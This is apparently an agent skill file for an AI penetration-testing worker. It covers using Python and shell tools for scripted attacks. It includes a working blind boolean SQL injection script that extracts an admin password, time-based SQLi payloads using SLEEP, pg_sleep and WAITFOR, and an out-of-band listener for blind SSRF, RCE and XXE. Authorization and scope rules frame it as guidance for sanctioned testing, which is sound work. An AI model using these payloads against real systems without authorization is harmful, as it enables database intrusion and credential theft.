---
name: code-exec
description: "Use explicitly available Python or shell operations for bounded authorized automation, oracle calibration, and compact evidence collection."
compatibility: "Contractor adk@1 native Agent Skill disclosure; recipes require visible run_python and/or execute_bash operations and only the environment guarantees in those tool descriptions"
metadata:
  source-revision: 9c76b56cf7b83377fb1dd5e4a17440fa27b723f3
---

# Conditional code execution

The historical operation names in this package are `run_python` and
`execute_bash`. Use either only when that exact operation is visible in the
current Worker invocation. Its actual schema and description are the source of
truth. This skill does not provide a container, executable, dependency,
filesystem, network route, process lifetime, writable directory, persistence,
or artifact export.

## Safety and authority

- Execute code only for an explicitly authorized target and purpose. Keep every
  request, callback, hostname, port, and input corpus inside the declared scope.
- Prefer non-destructive checks, controlled test identities, bounded request
  counts, explicit timeouts, and the smallest evidence needed. Stop after the
  oracle or impact is confirmed.
- Never inspect or modify the Runtime host, unrelated local files, credentials,
  services, or networks. Clean up files, processes, listeners, and target state
  when the visible operation actually permits creating them.

## When to use it

When a compatible operation is visible, use it for techniques needing **many
similar requests** or **non-trivial computation** — issuing one request per
reasoning turn burns the budget and times out.

- **Blind / iterative extraction** (boolean or time-based SQLi, enumeration):
  script the whole extraction in ONE `run_python` call. Use **binary search**
  per byte (≤~8 requests/char over the value range), not a linear scan, and not
  one tool call per character.
- **Brute force / fuzzing / parameter sweeps**: loop in the script, not in the
  conversation.
- **Crypto / encoding / token forging** (JWT alg-confusion, padding, hashing):
  compute in `run_python` only when the required Python modules are available.
- **One-off recon**: use `execute_bash` only when its environment actually
  provides the required executable and authorized network route.

For a single confirming probe, a visible authorized `http_request` operation is
usually simpler — don't spin up a script for one request.

## Oracle first — before any extraction

A blind extraction loop is only as good as its oracle. Before you script the
loop, **prove the oracle differentiates**: send one **known-TRUE** and one
**known-FALSE** condition and confirm the responses actually differ (body,
status, length, or timing). If they look identical, your injection point or
payload is wrong — **fix that first**. Never run an extraction loop on an oracle
you have not proven separates true from false: it just burns the budget
returning garbage, one wrong byte at a time. Calibrate, then extract.

Two bugs that silently make a loop never converge — guard against both:

- **Parse defensively.** The TRUE and FALSE branches may return *different
  content types* (e.g. JSON on success, an HTML error page on failure), so a
  bare `r.json()` throws on one branch and the byte never matches. Match on
  `r.text` (substring) or a status/length signal, or wrap `r.json()` in
  try/except — never assume the response shape.
- **Binary search needs a MONOTONIC comparator** (`>` / `<`, e.g.
  `ASCII(...)>mid`). An equality oracle (`...=mid`) is not monotonic, so the
  search cannot converge — use greater-than and narrow `[lo, hi]`.

## Idioms

Blind boolean-SQLi extraction (one call replaces hundreds of turns):

```
run_python(code='''
import requests, string
URL = "http://target/login"
charset = string.printable
def oracle(cond):
    r = requests.post(URL, data={"username": f"admin' AND {cond}-- ", "password":"x"})
    return "Welcome" in r.text            # adapt the true-condition signal
# calibrate FIRST: TRUE and FALSE controls must differ, else the injection is wrong
if not (oracle("1=1") and not oracle("1=2")):
    raise SystemExit("oracle does not differentiate — fix the injection, do not extract")
val = ""
for pos in range(1, 41):
    lo, hi = 32, 126
    while lo < hi:                        # binary search this byte
        mid = (lo + hi) // 2
        if oracle(f"ASCII(SUBSTRING(password,{pos},1))>{mid}"): lo = mid + 1
        else: hi = mid
    if lo == 32: break
    val += chr(lo); print(pos, val, flush=True)
print("RECOVERED:", val)
''', timeout_s=120)
```

**Time-based oracle (when TRUE and FALSE are byte-identical).** If the two
branches return the same body/status/length, fall back to a **timing** oracle:
inject a conditional delay — `SLEEP(3)` (MySQL), `pg_sleep(3)` (Postgres),
`WAITFOR DELAY '0:0:3'` (MSSQL) — gated on the condition, and make the oracle
`r.elapsed.total_seconds() > 2`. Calibrate baseline latency first, pick a delay
clearly above observed jitter, and **median 2-3 samples per probe** to survive
network noise:

```
import requests, statistics
def oracle(cond):
    def t():
        return requests.post(URL, data={"x": f"' AND IF(({cond}),SLEEP(3),0)-- "}).elapsed.total_seconds()
    return statistics.median(t() for _ in range(3)) > 2   # delay 3s, threshold above jitter
```

## Authenticated probing — use a Session

When `run_python` provides the `requests` package, drive a `requests.Session`
instead of bare
`requests.get/post`. The session preserves cookies (needed for cookie/CSRF-based
auth) across every request in the script, sets the auth once, and adds bounded
retries + a timeout so a flaky target doesn't hang the whole call:

```
import requests
from requests.adapters import HTTPAdapter, Retry
s = requests.Session()
s.headers["Authorization"] = "Bearer " + TOKEN   # optionally from auth_creds
s.mount("http://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.3, status_forcelist=[429,500,502,503])))
def get(p, **kw): return s.get(URL + p, timeout=10, **kw)
```

- **`preinit`**: use setup snippets only if that parameter exists in the visible
  tool schema; do not assume interpreter reuse between calls.
- **Files**: do not assume a working directory, cross-call persistence, or
  automatic artifact export. If the operation explicitly supports files, keep
  them bounded and move required evidence through a separately visible result
  or artifact operation before cleanup.
- **Budget**: when the schema exposes `timeout_s`, give loops a realistic cap and
  print compact progress with `flush=True`; otherwise stay inside the enclosing
  Stage limits.

## Out-of-band (OOB) detection

For **blind** SSRF / RCE / XXE where the response carries no signal, an OOB
callback is usable only when scope permits it and a visible operation explicitly
provides a reachable listener plus the required process lifetime. Do not infer
either from this skill. Under those stated guarantees, start a bounded listener,
embed its authorized callback address in the probe, then inspect its log or hit
count:

```
execute_bash(command="python -m http.server 8000 >/tmp/oob.log 2>&1 &", ...)
# inject http://<listener-host>:8000/ping?<marker> as the SSRF/XXE/RCE callback, send the probe
execute_bash(command="grep ping /tmp/oob.log")   # a hit == confirmed callback
```

Caveat: the target must be able to reach the advertised listener. Never start a
public collector unless it is separately provisioned and explicitly authorized;
otherwise report that OOB confirmation is unavailable.

## Reporting what a script found — REQUIRED

Code-execution output does not imply an auto-collected HTTP proof chain, and
stdout alone is not a durable verdict. Whatever a script recovers — a controlled
test value or other proof — carry the minimum necessary evidence into the
requested result:

1. If `submit_verdict` is visible, state the recovered evidence in its supported
   fields. Otherwise return it in the requested result artifact or response.
2. For a citable proof request, re-issue only the decisive request through a
   visible `http_request` operation. Cite a request tag only when its response
   contract actually returns one and the verdict schema accepts `request_ids`.

## Discipline

- **One robust script, not many attempts.** Add error handling and print
  progress; if a script errors, fix *that* error and re-run — don't fire off a
  dozen near-identical scripts (that's the same churn, just moved into the
  execution environment).
- Don't re-run an identical script; build on what the previous call produced.
- **Keep stdout small — it is fed back into the model's context.** Print only the
  recovered value, decisive status/length deltas, and a final `RESULT:` line;
  never dump full response bodies or large lists. Write bulk output (enumerated
  IDs, full responses, wordlist results) to a file only when the operation
  supports it, then export through a separately visible artifact operation;
  otherwise truncate safely and print a count.
- Stay on the authorized target. Code execution is for the assigned test, never
  for the Runtime host or its surrounding environment.
